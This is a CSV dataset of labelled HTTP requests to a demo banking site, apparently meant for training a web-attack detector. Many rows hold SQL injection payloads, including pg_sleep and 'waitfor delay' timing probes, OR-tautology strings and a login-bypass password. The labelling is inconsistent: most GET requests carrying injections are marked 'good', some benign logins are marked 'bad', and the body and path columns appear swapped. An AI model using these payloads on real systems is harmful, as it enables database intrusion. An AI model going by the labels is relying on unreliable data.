method,path,body,single_q,double_q,dashes,braces,spaces,badwords,class
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=NOqkusYP'));select%20pg_sleep(9);%20--%20,/sendFeedback,2,0,2,2,5,4,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/my%20documents/JohnSmith/Bank%20Site%20Documents/,0,0,0,0,0,0,good
GET,,/images,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp?query=%40%40pY60k,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=1'""",0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/my%20documents/JohnSmith/Bank%20Site%20Documents,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=-1'%20OR%203*2<(0%2B5%2B623-623)%20or%20'bkqL7jUZ'='&uid=e,/doLogin,8,0,0,2,4,2,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=-1;select%20pg_sleep(6);%20--%20&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,0,0,2,2,5,4,bad
POST,GDKvHjup';%20waitfor%20delay%20'0:0:4'%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,6,0,2,0,5,4,bad
GET,,/search.jsp?query=-1%20OR%202%2B646-646-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp?HostName=if(now()=sysdate()%2Csleep(6)%2C0),0,0,0,0,0,0,good
GET,,/index.jsp?content=UeMSmxvN&job=OperationalRiskManager:RiskManagement,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=Careers&template=%F0''%F0""""",0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:0'%20--%20,0,0,0,0,0,0,good
GET,,/index.jsp?content=personal_deposit.htm,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=g00dPa%24%24w0rD&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/disclaimer.htm,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=0'XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR'Z,/sendFeedback,4,0,0,10,2,2,bad
GET,,/index.jsp?content=pr/20061005.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=1%20waitfor%20delay%20'0:0:16'%20--%20,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
POST,ZG2n6kmh'));select%20pg_sleep(4);%20--%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1,/sendFeedback,2,0,2,2,3,4,bad
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/subscribe.swf,0,0,0,0,0,0,good
GET,,"/default.jsp?content=%BF'%BF""",0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,"/disclaimer.htm?url=%BF'%BF""",0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=business_deposit.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/my%20documents/,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=if(now()=sysdate()%2Csleep(3)%2C0),0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,"/Privacypolicy.jsp?sec=%F0''%F0""""&template=US",0,0,0,0,0,0,good
GET,,/index.jsp?content=%40%404n20p,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp?sec=Careers&template=7BYeFLnL');select%20pg_sleep(9);%20--%20,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=Teller:ConsumaerBanking,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp?step=0'XOR(if(now()=sysdate()%2Csleep(16)%2C0))XOR'Z,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=1%20waitfor%20delay%20'0:0:9'%20--%20&name=zFPWdwPk&subject=1,/sendFeedback,4,0,2,0,7,4,bad
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp?content=-1%20OR%202%2B446-446-1=0%2B0%2B0%2B1,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp?query=1*1*1*1,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Subscribe&txtEmail=YG8oc6YQ,/doSubscribe,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/disclaimer.htm,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
POST,btnSubmit=Login&passw=%5C&uid=1,/doLogin,0,0,0,0,0,2,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,"%BF'%BF""&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=1",/sendFeedback,2,2,0,0,0,0,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=2wJYJnwL'));select%20pg_sleep(3);%20--%20&job=CustomerServiceRepresentative:CustomerService,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/default.jsp?content=security.htm,0,0,0,0,0,0,good
GET,,/index.jsp?content=1%20waitfor%20delay%20'0:0:6'%20--%20&job=LoyaltyMarketingProgramManager:Marketing,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
POST,WpFC341P';select%20pg_sleep(29.62);%20--%20&passw=g00dPa%24%24w0rD&uid=e,/doLogin,2,0,2,2,3,6,bad
GET,,/sendFeedback,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=zFPWdwPk&subject=-1'%20OR%202%2B538-538-1=0%2B0%2B0%2B1%20--%20,/sendFeedback,2,0,2,0,6,0,bad
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/sendFeedback,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/favicon.ico,0,0,0,0,0,0,good
POST,submit=%20Submit%20&cfile=comments.txt&comments=1&email_addr=sample%40email.tst&name=oTIbFqtN';select%20pg_sleep(6);%20--%20&subject=1,/sendFeedback,2,0,2,2,5,4,bad
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/index.jsp?content=inside_jobs.htm&job=ExecutiveAssistant:Administration,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/util/serverStatusCheckService.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,"/index.jsp?content=inside_jobs.htm&job=-1""%20OR%202%2B534-534-1=0%2B0%2B0%2B1%20--%20",0,0,0,0,0,0,good
GET,,/disclaimer.htm?url=http://www.netscape.com,0,0,0,0,0,0,good
GET,,/default.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/index.jsp,0,0,0,0,0,0,good
GET,,/doSubscribe,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
GET,,/survey_questions.jsp,0,0,0,0,0,0,good
GET,,/search.jsp,0,0,0,0,0,0,good
GET,,/Privacypolicy.jsp,0,0,0,0,0,0,good
GET,,/doLogin,0,0,0,0,0,0,good
